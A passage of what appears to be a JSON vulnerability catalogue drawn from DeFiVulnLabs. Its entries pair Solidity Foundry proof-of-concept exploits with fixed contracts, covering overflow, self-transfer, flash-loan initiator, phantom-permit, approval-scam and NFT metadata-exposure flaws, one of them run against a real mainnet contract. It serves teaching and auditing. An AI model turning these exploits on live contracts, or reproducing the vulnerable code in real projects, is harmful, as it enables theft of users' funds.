Wei, or around 0.553 Ether. Where is the rest? What happened?\n\nWe are storing the balance in an uint64. Unsigned integers go from 0 to 2^n-1, \nso that's 2^64-1 or 18446744073709551615. So, it can store a max of 18.4467... \nEther. We sent 19 Ether to the contract. \nIt automatically rolls over to 0. So, we end up with 19000000000000000000 - 18446744073709551615 -1 (the 0 value) = 553255926290448384.\n*/\n    }\n\n    receive() external payable {}\n}\n\ncontract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n",
    "severity": "Medium",
    "category": "Arithmetic",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Invariant.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "self-transfer",
    "slug": "self-transfer",
    "title": "Missing Check for Self-Transfer Allows Funds to be Lost",
    "description": "The vulnerability in the code stems from the absence of a check to prevent self-transfers. \nThis oversight allows the transfer function to erroneously transfer funds to the same address. \nConsequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.\nThis vulnerability undermines the correctness of fund transfers within the contract and poses a risk \nto the integrity of user balances.",
    "mitigation": "Add condition to prevent transfer between same addresses\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679373800327241728\nhttps://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\nhttps://www.immunebytes.com/blog/bzxs-security-focused-relaunch-followed-by-a-hack-how/",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Missing Check for Self-Transfer Allows Funds to be Lost\n\nDescription:\nThe vulnerability in the code stems from the absence of a check to prevent self-transfers. \nThis oversight allows the transfer function to erroneously transfer funds to the same address. \nConsequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.\nThis vulnerability undermines the correctness of fund transfers within the contract and poses a risk \nto the integrity of user balances.\n \nMitigation:  \nAdd condition to prevent transfer between same addresses\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679373800327241728\nhttps://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\nhttps://www.immunebytes.com/blog/bzxs-security-focused-relaunch-followed-by-a-hack-how/\n*/\n\ncontract ContractTest is Test {\n    SimpleBank VSimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        VSimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testSelfTransfer() public {\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.balanceOf(address(this));\n        /*\n        unchecked {\n        _balances[_id][Alice] = 10000 - 10000;\n        _balances[_id][Alice] = 10000 + 10000;\n         total balance of [Alice] = 20000\n        }\n        */\n    }\n\n    function testFixedSelfTransfer() public {\n        vm.expectRevert(\"Cannot transfer funds to the same address.\");\n        FixedSimpleBankContract.transfer(address(this), address(this), 10000);\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        // not check self-transfer\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n        }\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        //Mitigation\n        require(_from != _to, \"Cannot transfer funds to the same address.\");\n\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n            /*\n            Another mitigation\n            _balances[_id][_from] -= _amount;\n            _balances[_id][_to] += _amount;\n            */\n        }\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/self-transfer.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "flashloan-flaw",
    "slug": "flashloan-flaw",
    "title": "Missing flash loan initiator check",
    "description": "Missing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.",
    "mitigation": "Check the initiator of the flash loan and revert if the initiator is not authorized.\n\nREF:\nhttps://twitter.com/ret2basic/status/1681150722434551809\nhttps://github.com/sherlock-audit/2023-05-dodo-judging/issues/34",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Missing flash loan initiator check\n\nDescription:\nMissing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.\n\nMitigation:  \nCheck the initiator of the flash loan and revert if the initiator is not authorized.\n\nREF:\nhttps://twitter.com/ret2basic/status/1681150722434551809\nhttps://github.com/sherlock-audit/2023-05-dodo-judging/issues/34\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    LendingPool LendingPoolContract;\n    SimpleBankBug SimpleBankBugContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        LendingPoolContract = new LendingPool(address(USDaContract));\n        SimpleBankBugContract = new SimpleBankBug(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n        USDaContract.transfer(address(LendingPoolContract), 10000 ether);\n        FixedSimpleBankContract = new FixedSimpleBank(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n    }\n\n    function testFlashLoanFlaw() public {\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(SimpleBankBugContract),\n            \"0x0\"\n        );\n    }\n\n    function testFlashLoanSecure() public {\n        vm.expectRevert(\"Unauthorized\");\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(FixedSimpleBankContract),\n            \"0x0\"\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        address receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        // Mitigation: make sure to check the initiator\n        require(_initiator == address(this), \"Unauthorized\");\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ninterface IFlashLoanReceiver {\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external;\n}\n\ncontract LendingPool {\n    IERC20 public USDa;\n\n    constructor(address _USDA) {\n        USDa = IERC20(_USDA);\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDa.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(USDa.transfer(borrower, amount), \"Flashloan transfer failed\");\n        IFlashLoanReceiver(borrower).executeOperation(\n            amount,\n            borrower,\n            msg.sender,\n            data\n        );\n\n        uint256 balanceAfter = USDa.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Flashloan-flaw.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "nft-mint-exposed-metadata",
    "slug": "nft-mint-exposed-metadata",
    "title": "NFT Mint via Exposed Metadata Vulnerability",
    "description": "The contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed\n\nREF:\nhttps://twitter.com/Supremacy_CA/status/1596176732729769985\nhttps://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nName: NFT Mint via Exposed Metadata Vulnerability\n\nDescription:\nThe contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed\n\nREF:\nhttps://twitter.com/Supremacy_CA/status/1596176732729769985\nhttps://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb\n*/\n \n\ncontract ContractTest is DSTest {\n    IFantasticWeslie nftContract =\n        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    bytes32[] merkleTreeProof;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16023847);\n    }\n\n    function testExploit() public {\n        //Since the contract is vulnerable to CVE-2022-38217\n        //it could lead to the early disclosure of metadata of all NFTs in the project\n        //As a result, attacker can find out valuable NFTs and then target mint specified NFTs by monitoring Mempool and sell the NFTs for a profit in secondary market\n\n        //For example, Lets assume the attacker finds out that NFT#142 is a rare NFT, now he just has to moniter the mempool till NFT#141 is minted and then mint NFT#142\n        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json\n        //The issue is the metadata should be visible after the minting is completed\n\n        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b\n        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83\n\n        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;\n        cheats.prank(attacker);\n\n        merkleTreeProof.push(\n            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6\n        );\n        merkleTreeProof.push(\n            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd\n        );\n        merkleTreeProof.push(\n            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c\n        );\n        merkleTreeProof.push(\n            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604\n        );\n        merkleTreeProof.push(\n            0xede88505e4259ab482a1019cc8d4364cf9e1e7866768245854c0f6e369d2b08c\n        );\n        merkleTreeProof.push(\n            0x776fee48d9285a8e2d1ecde47354e9ebe91b10f0b5f2d754968af831a7047808\n        );\n        merkleTreeProof.push(\n            0x3d13c4757d9e35123b8785040c29f232483941fb7d591b1a94167c1ca5e8875f\n        );\n        merkleTreeProof.push(\n            0xc36c091c358833709f1b6f44e783e5d9ad5ad9f5f0ee09a37c376fd354827fb1\n        );\n        merkleTreeProof.push(\n            0xce26991b2af9fc0fb807aea36667d37439ae7122d3ea8edcbfe92b04bf674922\n        );\n        merkleTreeProof.push(\n            0x8452c207732923a758c53fb296f3d88340a04fe9c381c73ba44343a45340953e\n        );\n        merkleTreeProof.push(\n            0xcc44822b3b5a19839899f6795622daff3bab327895558977ea58a30a42c6a49e\n        );\n        merkleTreeProof.push(\n            0x45c575962e5a88b5e8c3aedf4e3e74306d0124f4cc86c25bc4cd1bcae16c54a0\n        );\n\n        nftContract.mint{value: 0.12 ether}(merkleTreeProof);\n\n        console.log(\"Owner of NFT#142 : \", nftContract.ownerOf(142));\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/NFTMint_exposedMetadata.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "returnfalse",
    "slug": "returnfalse",
    "title": "No Revert on Failure",
    "description": "Some tokens do not revert on failure, but instead return false (e.g. ZRX).\n\nZRX transfer return false:\n    function transfer(address _to, uint _value) returns (bool) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n            Transfer(msg.sender, _to, _value);\n            return true;\n        } else { return false; }\n    }",
    "mitigation": "Use OpenZeppelin’s SafeERC20 library and change transfer to safeTransfer.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: No Revert on Failure\n\nDescription:\nSome tokens do not revert on failure, but instead return false (e.g. ZRX).\n\nZRX transfer return false:\n    function transfer(address _to, uint _value) returns (bool) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n            Transfer(msg.sender, _to, _value);\n            return true;\n        } else { return false; }\n    }\n\nMitigation:\nUse OpenZeppelin’s SafeERC20 library and change transfer to safeTransfer.\n*/\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant zrx = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        zrx.transfer(address(this), 123); //return false, do not revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransferFail() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n\n        // https://github.com/foundry-rs/foundry/issues/5367 can't vm.expectRevert\n        // vm.expectRevert(\"SafeERC20: ERC20 operation did not succeed\");\n        zrx.safeTransfer(address(this), 123); //revert\n\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Returnfalse.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "oracle-stale",
    "slug": "oracle-stale",
    "title": "Oracle data feed is insufficiently validated",
    "description": "Chainlink price feed latestRoundData is used to retrieve price feed from chainlink. \nWe need to makes sure that the answer is not negative and  price is not stale.",
    "mitigation": "latestAnswer function is deprecated. Instead, use the latestRoundData function \nto retrieve the price and make sure to add checks for stale data.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674611468975878144\nhttps://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94\nhttps://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price\nhttps://docs.chain.link/data-feeds/historical-data#getrounddata-return-values",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Oracle data feed is insufficiently validated\n\nDescription:\nChainlink price feed latestRoundData is used to retrieve price feed from chainlink. \nWe need to makes sure that the answer is not negative and  price is not stale.\n\nMitigation:\nlatestAnswer function is deprecated. Instead, use the latestRoundData function \nto retrieve the price and make sure to add checks for stale data.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674611468975878144\nhttps://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94\nhttps://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price\nhttps://docs.chain.link/data-feeds/historical-data#getrounddata-return-values\n*/\n\ncontract ContractTest is Test {\n    AggregatorV3Interface internal priceFeed;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n        ); // ETH/USD\n    }\n\n    function testUnSafePrice() public {\n        //Chainlink oracle data feed is not sufficiently validated and can return stale price.\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    function testSafePrice() public {\n        (\n            uint80 roundId,\n            int256 answer,\n            ,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        /*\n        Mitigation:\n        answeredInRound: The round ID in which the answer was computed\n        updatedAt: Timestamp of when the round was updated\n        answer: The answer for this round\n        */\n        require(answeredInRound >= roundId, \"answer is stale\");\n        require(updatedAt > 0, \"round is incomplete\");\n        require(answer > 0, \"Invalid feed answer\");\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    receive() external payable {}\n}\n\ninterface AggregatorV3Interface {\n    function latestRoundData()\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        );\n}\n",
    "severity": "Medium",
    "category": "Oracle",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Oracle-stale.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "approve-scam",
    "slug": "approve-scam",
    "title": "Over-Permissive Approve Scam",
    "description": "This vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.",
    "mitigation": "Users should only approve the amount of tokens necessary for the operation at hand.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Over-Permissive Approve Scam\n\nDescription:\nThis vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.\n\nMitigation:\nUsers should only approve the amount of tokens necessary for the operation at hand. \n*/\n\ncontract ContractTest is Test {\n    ERC20 ERC20Contract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testApproveScam() public {\n        ERC20Contract = new ERC20();\n        ERC20Contract.mint(1000);\n        ERC20Contract.transfer(address(alice), 1000);\n\n        vm.prank(alice);\n        // Be Careful to grant unlimited amount to unknown website/address.\n        // Do not perform approve, if you are sure it's from a legitimate website.\n        // Alice granted approval permission to Eve.\n        ERC20Contract.approve(address(eve), type(uint256).max);\n\n        console.log(\n            \"Before exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\n            \"Due to Alice granted transfer permission to Eve, now Eve can move funds from Alice\"\n        );\n        vm.prank(eve);\n        // Now, Eve can move funds from Alice.\n        ERC20Contract.transferFrom(address(alice), address(eve), 1000);\n        console.log(\n            \"After exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ERC20 is IERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ApproveScam.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "phantom-permit",
    "slug": "phantom-permit",
    "title": "Phantom function - Permit Function",
    "description": "Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.\nkey:\n1.Token that does not support EIP-2612 permit. \n2.Token has a fallback function.\nFor example: WETH.",
    "mitigation": "Use SafeERC20's safePermit - Revert on invalid signature.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671347058568237057\nhttps://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: Phantom function - Permit Function \n\nDescription:\nPhantom function: Accepts any call to a function that it doesn't actually define, without reverting.\nkey:\n1.Token that does not support EIP-2612 permit. \n2.Token has a fallback function.\nFor example: WETH.\n\nMitigation:  \nUse SafeERC20's safePermit - Revert on invalid signature.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671347058568237057\nhttps://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f\n*/\n\ncontract ContractTest is Test {\n    VulnPermit VulnPermitContract;\n    WETH9 WETH9Contract;\n\n    function setUp() public {\n        WETH9Contract = new WETH9();\n        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract)));\n    }\n\n    function testVulnPhantomPermit() public {\n        address alice = vm.addr(1);\n        vm.deal(address(alice), 10 ether);\n\n        vm.startPrank(alice);\n        WETH9Contract.deposit{value: 10 ether}();\n        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);\n        vm.stopPrank();\n        console.log(\n            \"start WETH balanceOf this\",\n            WETH9Contract.balanceOf(address(this))\n        );\n\n        VulnPermitContract.depositWithPermit(\n            address(alice),\n            1000,\n            27,\n            0x0,\n            0x0\n        );\n        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));\n        console.log(\"WETH balanceOf VulnPermitContract\", wbal);\n\n        VulnPermitContract.withdraw(1000);\n\n        wbal = WETH9Contract.balanceOf(address(this));\n        console.log(\"WETH9Contract balanceOf this\", wbal);\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnPermit {\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        token = _token;\n    }\n\n    function deposit(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function depositWithPermit(\n        address target,\n        uint256 amount,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        (bool success, ) = address(token).call(\n            abi.encodeWithSignature(\n                \"permit(address,uint256,uint8,bytes32,bytes32)\",\n                target,\n                amount,\n                v,\n                r,\n                s\n            )\n        );\n        require(success, \"Permit failed\");\n\n        require(\n            token.transferFrom(target, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function withdraw(uint256 amount) public {\n        require(token.transfer(msg.sender, amount), \"Transfer failed\");\n    }\n}\n\n// contract Permit {\n//     IERC20 public token;\n\n//     constructor(IERC20 _token) {\n//         token = _token;\n//     }\n\n//     function deposit(uint256 amount) public {\n//         require(\n//             token.transferFrom(msg.sender, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function depositWithPermit(\n//         address target,\n//         uint256 amount,\n//         uint8 v,\n//         bytes32 r,\n//         bytes32 s\n//     ) public {\n//         (bool success, ) = address(token).call(\n//             abi.encodeWithSignature(\n//                 \"permit(address,uint256,uint8,bytes32,bytes32)\",\n//                 target,\n//                 amount,\n//                 v,\n//                 r,\n//                 s\n//             )\n//         );\n//         require(success, \"Permit failed\");\n\n//         require(\n//             token.transferFrom(target, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function withdraw(uint256 amount) public {\n//         require(token.transfer(msg.sender, amount), \"Transfer failed\");\n//     }\n// }\n\ncontract WETH9 {\n    string public name = \"Wrapped Ether\";\n    string public symbol = \"WETH\";\n    uint8 public decimals = 18;\n\n    event Approval(address indexed src, address indexed guy, uint wad);\n    event Transfer(address indexed src, address indexed dst, uint wad);\n    event Deposit(address indexed dst, uint wad);\n    event Withdrawal(address indexed src, uint wad);\n\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n\n    fallback() external payable {\n        deposit();\n    }\n\n    receive() external payable {}\n\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return 